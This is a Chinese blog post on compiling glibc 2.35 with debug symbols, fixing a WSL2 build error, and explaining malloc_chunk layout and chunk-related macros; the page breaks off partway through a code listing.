<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>libc的源码调试与分析 | Photon’s Blog</title><meta name="keywords" content="pwn,heap,IO_FILE,libc"><meta name="author" content="Photon"><meta name="copyright" content="Photon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有自己总结一遍来得深刻。而最近确实一直在摆烂，所以借此机会督促自己学点什么东西。 这里主要分析的是内存管理模块还有一些IO模块">
<meta property="og:type" content="article">
<meta property="og:title" content="libc的源码调试与分析">
<meta property="og:url" content="http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Photon’s Blog">
<meta property="og:description" content="之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有自己总结一遍来得深刻。而最近确实一直在摆烂，所以借此机会督促自己学点什么东西。 这里主要分析的是内存管理模块还有一些IO模块">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg">
<meta property="article:published_time" content="2023-03-31T08:37:53.000Z">
<meta property="article:modified_time" content="2023-04-06T16:57:00.373Z">
<meta property="article:author" content="Photon">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="heap">
<meta property="article:tag" content="IO_FILE">
<meta property="article:tag" content="libc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg"><link rel="shortcut icon" href="/img/20170202211516_4B3nj.thumb.1000_0.jpeg"><link rel="canonical" href="http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'libc的源码调试与分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-07 00:57:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Photon’s Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Photon’s Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">libc的源码调试与分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-31T08:37:53.000Z" title="Created 2023-03-31 16:37:53">2023-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-06T16:57:00.373Z" title="Updated 2023-04-07 00:57:00">2023-04-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">20.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>99min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>之前也断断续续看过一些libc的实现（在之前的fastbin reverse into tcache以及large bin attack文章中总结过一些），但是总感觉不太连贯，没有形成一个体系。并且光干看代码总感觉少点什么。如果看别的大佬的博客的话，最终还是别人的，远远没有自己总结一遍来得深刻。而最近确实一直在摆烂，所以借此机会督促自己学点什么东西。</p>
<p>这里主要分析的是内存管理模块还有一些IO模块</p>
<h1 id="glibc的源码调试配置"><a href="#glibc的源码调试配置" class="headerlink" title="glibc的源码调试配置"></a>glibc的源码调试配置</h1><p>我们知道，如果我们想用gdb进行源码级调试，我们可以在编译的时候添加<code>-g</code>选项，然后便可以对程序进行调试。但是如果我们想要对glibc进行源码级调试，我们需要带调试版本的glibc</p>
<p>主要有两种方案，一种是直接下载官方编译好的带符号的glibc，还有一种是自行编译，这里选择了后者,方便我们对源码进行魔改，也方便调试不同版本的源码。</p>
<p>另外提一句，推荐利用<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站">https://elixir.bootlin.com/glibc/glibc-2.35进行源码的观看，可以很方便的查定义与引用的地方(当时学kernel的时候也是看的这个网站</a>)</p>
<h2 id="下载glibc源码"><a href="#下载glibc源码" class="headerlink" title="下载glibc源码"></a>下载glibc源码</h2><p>在如下网址可以根据偏好下载相应glibc版本的源码。我选择的是glibc-2.35</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;glibc&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="编译带符号的glibc"><a href="#编译带符号的glibc" class="headerlink" title="编译带符号的glibc"></a>编译带符号的glibc</h2><p>首先我们需要建立一个编译目录(glibc不允许直接在原目录下进行编译)。这里我在glibc-2.35的上级目录建立了一个名叫<code>build</code>的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir build</span><br></pre></td></tr></table></figure>
<p>然后执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ CXXFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span></span><br><span class="line">$ ../glibc-2.35/configure --prefix=&lt;/glibc/path&gt;</span><br></pre></td></tr></table></figure>
<p>(尖括号里面的路径自行替换)笔者在执行的时候出现了make版本过低的错误，以及一个关于LD_LIBRARY_PATH的错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** These critical programs are missing or too old:make...</span><br><span class="line">LD_LIBRARY_PATH shouldn&#39;t contain the current directory when..</span><br></pre></td></tr></table></figure>
<p>升级完make，然后<code>unset  LD_LIBRARY_PATH</code>即可</p>
<p>执行完之后会生成Makefile 相关的文件，之后make即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
<p>需要编译挺长时间的。而且中途会出现一些错误。比如说笔者用的是<code>WSL2</code>,曾出现过这个错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1092</span>: undefined reference to `__lll_lock_wait_private<span class="number">&#x27;</span></span><br><span class="line">/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/glibc<span class="number">-2.35</span>/elf/../elf/dl-tls.c:<span class="number">1103</span>: undefined reference to `__lll_lock_wake_private<span class="number">&#x27;</span></span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">Makefile:1234: recipe for target &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/build/elf/ld.so&#x27; failed</span><br><span class="line">make[<span class="number">2</span>]: *** [/mnt/d/DeskTop/glibc/glibc<span class="number">-2.35</span>/build/elf/ld.so] Error <span class="number">1</span></span><br><span class="line">make[2]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35/elf&#x27;</span><br><span class="line">Makefile:483: recipe for target &#x27;elf/subdir_lib&#x27; failed</span><br><span class="line">make[<span class="number">1</span>]: *** [elf/subdir_lib] Error <span class="number">2</span></span><br><span class="line">make[1]: Leaving directory &#x27;/mnt/d/DeskTop/glibc/glibc-2.35/glibc-2.35&#x27;</span><br><span class="line">Makefile:9: recipe for target &#x27;all&#x27; failed</span><br><span class="line">make: *** [all] Error <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>根据查阅资料，似乎是因为大小写敏感所导致的。(参见<a href="[Linker error · Issue #742 · riscv-collab/riscv-gnu-toolchain (github.com">这个</a>](<a target="_blank" rel="noopener" href="https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742">https://github.com/riscv-collab/riscv-gnu-toolchain/issues/742</a>)) 和<a href="[glibc compilation error: undefined reference to `__lll_lock_wait_private&#39; - Stack Overflow](https://stackoverflow.com/questions/73417071/glibc-compilation-error-undefined-reference-to-lll-lock-wait-private">这个</a>) )</p>
<p>把build目录设置成大小写敏感应该就行了,需要注意的是，要递归地进行目录设置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r&#x27;D:\DeskTop\glibc\glibc-2.35\build&#x27;</span></span><br><span class="line"><span class="keyword">for</span> folderName, subfolders, fileNames <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    os.system(<span class="string">&#x27;fsutil.exe file SetCaseSensitiveInfo &#x27;</span> + folderName + <span class="string">&#x27; enable&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;转化完成&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后应该就能修好，如果不行的话可以<code>make clean</code>一下试试</p>
<p>之后build目录下就有了编译好的libc文件了。</p>
<p>后面你可以选择利用<code>patchelf</code>修改ld.so与libc，然后就能实现源码调试了</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="内存管理模块"><a href="#内存管理模块" class="headerlink" title="内存管理模块"></a>内存管理模块</h2><p>关于<code>malloc</code>的实现主要在<code>malloc/</code>目录下</p>
<h3 id="相关数据结构与宏"><a href="#相关数据结构与宏" class="headerlink" title="相关数据结构与宏"></a>相关数据结构与宏</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>首先当然是典中典之chunk的结构。当我们通过malloc等函数申请一块内存区域时，如果成功glibc将会把一个指向chunk的数据部分的指针返回给我们。</p>
<p>一般我个人喜欢把<code>chunk</code>分为chunk头部分以及数据部分。chunk头包含<code>mchunk_prev_size</code>以及<code>mchunk_size</code>，一般而言是用户不能直接控制的(溢出或者修改指针除外)。而数据部分就是拿来存储用户数据的（包括后面的fd,bk字段，但是这些字段是只有free的时候才会有意义，而在使用阶段被用户拿来作为存储数据）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>INTERNAL_SIZE_T</code>宏定义为<code>size_t</code> 在32位下为4字节，64位下为8字节。</p>
<p>各个字段解释如下</p>
<ul>
<li><code>mchunk_prev_size</code>:如果这个chunk物理相邻的上一个chunk(地址比它小，并且指针差值刚好为前一个chunk的大小)是空闲的，那么这个字段记录的是上面一个chunk的大小。若非空闲，则可以被上一个chunk拿来存储数据</li>
<li><code>mchunk_size</code>: 记录当前chunk的大小。大小必须是2*SIZE_SZ的整数倍。如果malloc的时候不是整数倍会被自动转化(后面对宏以及malloc函数的解释中有介绍实现)。其中SIZE_SZ在32位系统中为4，64位系统中为8。所以mchunk_size是至少8字节对齐的，也就是说最后3比特位必定是0.因此为了空间复用，我们把最后三位用来记录一些属性，其中从高到低为 :<ul>
<li><code>NON_MAIN_ARENA</code>:记录该chunk是否不属于主线程，1代表不属于主线程，0代表属于主线程</li>
<li><code>IS_MAPPED</code>，记录当前 chunk 是否是由 mmap 分配的</li>
<li><code>PREV_INUSE</code> 记录前一个chunk块是否被分配。</li>
</ul>
</li>
<li><code>fd,bk</code> 。当chunk处于使用状态时，从fd开始(包括fd)是用来存储用户数据的。当chunk处于free状态时，fd指向下一个空闲的chunk，而bk指向上一个空闲的chunk。<strong>需要注意的是这里fd，bk指向的空闲chunk并不一定是物理相邻的。fd，bk的作用是根据chunk的大小放入相应的bin之后用来像链表一样连接每个chunk(打个比方每个bins的头类似一个头节点，然后被free的第一个chunk满足一个bins的大小之后被链进去，第二个被free的chunk同样满足大小之后也会被链进去，此时这两个chunk之间的fd，bk就起到了连接两个chunk的左右。但是视bin的实现而定，有些是单向链表有些事双向</strong></li>
<li><code>fd_nextsize， bk_nextsize</code>。同<code>fd,bk</code>，不过只有大chunk(满足large chunk的大小范围)才用。具体的我在之前的一篇介绍<code>large bin attack</code>的博客中介绍过</li>
</ul>
<h4 id="相关的宏"><a href="#相关的宏" class="headerlink" title="相关的宏"></a>相关的宏</h4><p>这里介绍一些可能会用到的宏（主要是对注释进行渣翻以及给点自己的理解）</p>
<h5 id="chunk相关的宏"><a href="#chunk相关的宏" class="headerlink" title="chunk相关的宏"></a>chunk相关的宏</h5><p>chunk相关的宏:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tag_at (<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*chunk头的大小，为2*SIZE_SZ(SIZE_SZ在32位系统中为4，64位系统中为8)。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_HDR_SZ (2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把chunk地址转化为数据部分的地址(加上一个chunk头的大小即可) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个和上面的chunk2mem_tag差不多，但是在使用了tag时会提取正确的tag(一些系统支持tag的概念，不过这不是我们关注的重点,当成不使用tag即可*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem_tag(p) ((void*)tag_at ((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 把用户使用的数据部分的地址转化为chunk地址(减去一个chunk头的大小即可) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)tag_at (((char*)(mem) - CHUNK_HDR_SZ)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最小可能的chunk大小 （fd_nextsize在malloc_chunk中的偏移)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">/*可分配的对齐chunk的最小大小 这个MALLOC_ALIGN_MASK可以在某处注释中找到(MALLOC_ALIGN_MASK is CHUNK_HDR_SZ-1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">/*检查某个chunk是否对齐(判断末尾3(32位下)/4(64位下)比特位是否是0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT定义在sysdeps/generic/malloc-alignment.h中，其定义如下</span></span><br><span class="line"><span class="comment">#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="comment">			  ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br><span class="line"><span class="comment">简而言之是取2 * SIZE_SZ与__alignof__ (long double)中较小的那个</span></span><br><span class="line"><span class="comment">其中__alignof__是获取类型的对齐结果</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*misaligned_chunk(p) 检查是否对齐，返回的是一个与值结果，如果未对齐返回的是非0*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == CHUNK_HDR_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">/* Note: This must be a macro that evaluates to a compile time constant</span></span><br><span class="line"><span class="comment">   if passed a literal constant.  */</span></span><br><span class="line"><span class="comment">/*将请求的大小转化为实际分配的size大小。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if REQ overflows when padded and aligned and if the resulting value</span></span><br><span class="line"><span class="comment">   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in</span></span><br><span class="line"><span class="comment">   case the value is less than MINSIZE on SZ or false if any of the previous</span></span><br><span class="line"><span class="comment">   check fail.  */</span></span><br></pre></td></tr></table></figure>
<h5 id="标志位相关的宏"><a href="#标志位相关的宏" class="headerlink" title="标志位相关的宏"></a>标志位相关的宏</h5><p>以及chunk的标志位相关的宏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 